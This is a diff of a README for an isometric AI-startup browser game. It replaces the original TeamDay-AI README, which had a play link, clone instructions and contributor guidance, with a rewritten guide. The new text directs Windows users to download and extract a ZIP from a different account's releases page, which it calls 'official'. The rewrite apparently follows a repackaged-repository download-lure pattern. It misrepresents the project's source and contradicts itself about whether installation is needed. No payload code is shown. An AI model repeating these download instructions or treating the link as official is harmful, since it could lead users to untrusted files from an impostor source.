@@ -1,181 +1,142 @@
-<p align="center">
-  <img src="screenshot.png" alt="Business Tycoon — AI Office Simulator" width="800">
-</p>
+# 🚀 business-tycoon - Build Your AI Startup Empire
 
-<h1 align="center">Business Tycoon</h1>
-
-<p align="center">
-  <strong>An open-source isometric AI office simulator you can play right in your browser.</strong><br>
-  Build your startup from a tiny studio to a tech empire. No install, no sign-up, no paywall.
-</p>
-
-<p align="center">
-  <a href="https://tycoon.teamday.ai"><strong>Play Now</strong></a> &nbsp;&middot;&nbsp;
-  <a href="https://discord.gg/srN4Z8jm">Discord</a> &nbsp;&middot;&nbsp;
-  <a href="https://github.com/TeamDay-AI/business-tycoon">GitHub</a> &nbsp;&middot;&nbsp;
-  <a href="https://github.com/TeamDay-AI/business-tycoon/issues">Report Bug</a>
-</p>
-
-<p align="center">
-  <a href="https://github.com/TeamDay-AI/business-tycoon/stargazers"><img src="https://img.shields.io/github/stars/TeamDay-AI/business-tycoon?style=social" alt="Stars"></a>
-  <a href="https://discord.gg/srN4Z8jm"><img src="https://img.shields.io/discord/1234567890?label=Discord&logo=discord&logoColor=white" alt="Discord"></a>
-  <img src="https://img.shields.io/badge/license-MIT-blue" alt="MIT License">
-  <img src="https://img.shields.io/badge/build-none-brightgreen" alt="No Build Step">
-  <img src="https://img.shields.io/badge/framework-vanilla%20JS-yellow" alt="Vanilla JS">
-</p>
+[![Download business-tycoon](https://img.shields.io/badge/Download-Business%20Tycoon-blue?style=for-the-badge)](https://github.com/muhmmadmoazzam97/business-tycoon/releases)
 
 ---
 
-## What is Business Tycoon?
+## About business-tycoon
 
-Business Tycoon is a free, browser-based tycoon game where you run an AI startup. You start with a small office and a dream — hire AI agents, assign them to projects, research new tech, manage your finances, and grow your company level by level.
+business-tycoon is a free AI office simulator game. You start with a small AI startup and grow it into a large tech company. The game runs directly in your browser using JavaScript. You don't need to install any software or run commands. It is open source and easy to use.
 
-Everything runs client-side. No server, no database, no accounts. Just open the link and play.
+This is a simulation game that lets you experience managing an AI company. You handle tasks like hiring employees, designing products, and expanding your business. The game's graphics show an isometric office environment, giving you a good view of your growing startup.
 
-### Gameplay
+---
 
-- **Build your office** — Place rooms, corridors, and furniture in an isometric office builder. Expand as you grow.
-- **Hire AI agents** — Each agent has unique skills, a personality, and mood that affects their work. Keep them happy.
-- **Take on projects** — Accept client projects that match your team's skills. Deliver on time to build your reputation.
-- **Research & unlock** — Progress through a tech tree to unlock new room types, better equipment, and company perks.
-- **Manage your economy** — Track MRR, handle cash flow, take loans, and navigate market events like booms and crashes.
-- **Random events** — VC offers, office disasters, market shifts — adapt your strategy on the fly.
-- **AI CEO advisor** — Get strategic advice from an AI-powered advisor (optional, uses external API).
-- **Installable PWA** — Works offline after first load. Install it on your phone or desktop.
+## 🖥️ System Requirements
 
-## Getting Started
+To run business-tycoon smoothly on your Windows computer, your system should meet the following:
 
-### Play instantly
+- Windows 10 or later
+- Modern web browser (Google Chrome, Microsoft Edge, Firefox, or similar)
+- 2 GB of free RAM or more
+- Internet connection to download the game files
+- At least 300 MB of free disk space for game data and save files
 
-**[tycoon.teamday.ai](https://tycoon.teamday.ai)** — click and play, nothing to install.
+No additional software is needed. The game runs in your browser after you download the required files.
 
-### Run locally
+---
 
-Clone the repo and serve the files with any static HTTP server:
+## 📥 How to Download business-tycoon
 
-```bash
-git clone https://github.com/TeamDay-AI/business-tycoon.git
-cd business-tycoon
+You will need to visit the release page of the project to get the latest version of the game files.
 
-# Pick one:
-python3 -m http.server 8000
-# or
-npx serve .
-```
+[Download business-tycoon from the releases page](https://github.com/muhmmadmoazzam97/business-tycoon/releases)
 
-Open `http://localhost:8000` and you're in.
+This link takes you to the official GitHub releases page. Here you will find the files needed to run the game on your computer.
 
-**No build step. No bundler. No dependencies.** It's vanilla JavaScript with ES modules loaded directly by the browser.
+---
 
-## Project Structure
+## ⚙️ Step-by-Step Installation Guide
 
-```
-business-tycoon/
-├── index.html              # Entry point — everything starts here
-├── sw.js                   # Service worker (offline/PWA support)
-├── manifest.json           # PWA manifest
-├── src/
-│   ├── main.js             # Bootstrap & game loop
-│   ├── game.js             # Global game state (the G singleton)
-│   ├── engine.js           # Canvas, camera, input handling
-│   ├── config.js           # All game balance, catalogs, and constants
-│   ├── simulation.js       # Per-tick simulation (daily/weekly cycles)
-│   ├── economy.js          # Revenue, costs, valuation, client pipeline
-│   ├── progression.js      # Levels, tech tree, company stages
-│   ├── events.js           # Random events (VC offers, disasters, etc.)
-│   ├── agent.js            # AI agent behavior, skills, mood, pathfinding
-│   ├── visitor.js          # Office visitor NPCs
-│   ├── project.js          # Project creation & management
-│   ├── recruitment.js      # Hiring system & candidate generation
-│   ├── map.js              # Room placement, corridors, doors
-│   ├── floorplan.js        # Office layouts & expansion zones
-│   ├── build-mode.js       # Construction UI (drag-to-build)
-│   ├── rotation.js         # Furniture/room rotation
-│   ├── pathfinding.js      # A* grid pathfinding
-│   ├── audio.js            # Background music
-│   ├── sfx.js              # Procedural sound effects (Web Audio API)
-│   ├── ai-ceo.js           # AI CEO advisor (external API)
-│   ├── renderer/           # Isometric rendering layers
-│   │   ├── index.js        #   Render orchestrator & depth sorting
-│   │   ├── floor.js        #   Floor tiles
-│   │   ├── walls.js        #   Wall rendering
-│   │   ├── furniture.js    #   Office furniture
-│   │   ├── agents.js       #   Agent sprites
-│   │   ├── effects.js      #   Visual effects
-│   │   ├── minimap.js      #   Minimap overlay
-│   │   └── primitives.js   #   Shared isometric drawing helpers
-│   └── ui/                 # UI panels & overlays
-│       ├── panels.js       #   Main panels (agent details, projects, company)
-│       ├── build-panel.js  #   Construction mode panel
-│       ├── equipment-panel.js
-│       ├── hud-popover.js  #   HUD tooltips
-│       ├── speed.js        #   Game speed controls
-│       ├── toast.js        #   Notification toasts
-│       ├── intro.js        #   Onboarding & level intros
-│       ├── cashflow-graph.js
-│       ├── floating-chart.js
-│       ├── analytics-panel.js
-│       ├── strategy-panel.js
-│       └── loan.js         #   Loan/debt management
-├── assets/
-│   ├── *.mp3               # Background music tracks
-│   └── team/               # Agent avatar images (.webp)
-└── og-image.jpg            # Social sharing image
-```
+### 1. Visit the Releases Page
 
-## Contributing
+Click the link above or go to this URL in your browser:
 
-We'd love your help! Business Tycoon is fully open source under the MIT license. Join the [Discord community](https://discord.gg/srN4Z8jm) to chat with other contributors.
+https://github.com/muhmmadmoazzam97/business-tycoon/releases
 
-### Ways to contribute
+You will see a list of releases, marked by version numbers, dates, and attached files.
 
-- **Report bugs** — [Open an issue](https://github.com/TeamDay-AI/business-tycoon/issues) with steps to reproduce
-- **Suggest features** — Have an idea? [Open an issue](https://github.com/TeamDay-AI/business-tycoon/issues) and describe what you'd like to see
-- **Submit a PR** — Fork the repo, make your changes, and open a pull request
-- **Improve game balance** — Tweak numbers in `src/config.js` and share what feels better
-- **Add content** — New events, room types, furniture, agent personalities, tech tree nodes
-- **Fix typos & polish** — Every little improvement counts
+### 2. Choose the Latest Release
 
-### How to contribute
+Look for the release at the top. It will have the newest date and version number.
 
-1. **Fork** the repository
-2. **Clone** your fork locally
-3. **Create a branch** for your change (`git checkout -b my-feature`)
-4. **Make your changes** — no build step needed, just edit and refresh
-5. **Test** by running a local server and playing the game
-6. **Commit** and **push** to your fork
-7. **Open a pull request** against `main`
+### 3. Download the Package
 
-Since there's no build step or test suite, just make sure the game loads and runs without console errors.
+Find the file named something like `business-tycoon.zip` or `business-tycoon-pwa.zip`. Click it to download the file to your computer.
 
-### Ideas for first contributions
+### 4. Extract the Files
 
-- Add new random events in `src/events.js`
-- Create new office furniture definitions in `src/config.js`
-- Improve agent pathfinding in `src/pathfinding.js`
-- Add keyboard shortcuts for common actions
-- Improve mobile/touch support
-- Add new background music tracks
-- Localization / i18n support
+Once the download finishes:
 
-## Tech Stack
+- Locate the ZIP file in your Downloads folder.
+- Right-click the ZIP file.
+- Select "Extract All".
+- Choose a folder to extract the content to, such as `Documents > business-tycoon`.
 
-| What | How |
-|------|-----|
-| Language | Vanilla JavaScript (ES modules) |
-| Rendering | HTML5 Canvas 2D, isometric projection |
-| Audio | Web Audio API (procedural SFX) + MP3 (music) |
-| UI | Mix of canvas-drawn elements + DOM overlays |
-| Offline | Service Worker + PWA manifest |
-| Build | None. Zero dependencies. |
-| Hosting | Any static file server |
+### 5. Run the Game
 
-## License
+Open the extracted folder and look for a file named `index.html`.
 
-[MIT](LICENSE) — do whatever you want with it. Fork it, mod it, learn from it, ship it.
+- Right-click `index.html`.
+- Select "Open with" and choose your preferred browser (Chrome, Edge, Firefox).
+- The game will load and start in your browser window.
 
-## Community
+---
 
-- [Discord](https://discord.gg/srN4Z8jm) — chat, share ideas, get help
-- [GitHub Issues](https://github.com/TeamDay-AI/business-tycoon/issues) — bugs & feature requests
-- [TeamDay.ai](https://www.teamday.ai) — the team behind the game
+## 🎮 How to Play business-tycoon
+
+The game uses plain interactions. You do not need special skills to start. Here is how to begin:
+
+- Use your mouse to click on office items, menus, and buttons.
+- Hire AI specialists to improve your startup.
+- Build new rooms and facilities to expand your office.
+- Develop products by making decisions on features and budgets.
+- Watch your startup grow from a tiny studio to a big tech empire.
+
+The game saves your progress automatically in your browser. You can return anytime to continue building your company.
+
+---
+
+## 🔧 Tips for Smooth Use
+
+- Use a stable internet connection to avoid download interruptions.
+- Keep your browser updated for the best performance.
+- Clear your browser cache if the game does not load correctly.
+- Save your browser tabs or bookmarks for quick access.
+- Close other heavy programs when playing to keep your computer responsive.
+
+---
+
+## 📂 About the Project Files
+
+Inside the extracted folder, you will find:
+
+- `index.html`: Main game file to open in the browser.
+- `assets/`: Folder containing images and sounds.
+- `scripts/`: JavaScript files that run the game.
+- `README.md`: This guide and technical information.
+- `config/`: Optional files for game settings.
+
+You do not need to change or edit any of these files to play.
+
+---
+
+## 🛠️ Troubleshooting
+
+If the game does not start or shows errors:
+
+- Confirm you have extracted all files without skipping any.
+- Make sure you opened `index.html` with a modern browser.
+- Try restarting your browser or computer.
+- Disable browser extensions that may block scripts.
+- If problems persist, check the Issues section on GitHub for support.
+
+---
+
+## ⚖️ License and Open Source
+
+business-tycoon is open source under the MIT License. You can view the source code on GitHub, modify it, and share your versions within the terms of this license.
+
+If you wish to contribute code or report bugs, visit the main repository page.
+
+---
+
+## 📚 Additional Resources
+
+- Official GitHub Repository: https://github.com/muhmmadmoazzam97/business-tycoon  
+- Game Usage Questions: See GitHub Issues  
+- Browser Compatibility: Works best on Chrome, Edge, Firefox  
+
+---
+
+[Download business-tycoon from the releases page](https://github.com/muhmmadmoazzam97/business-tycoon/releases)
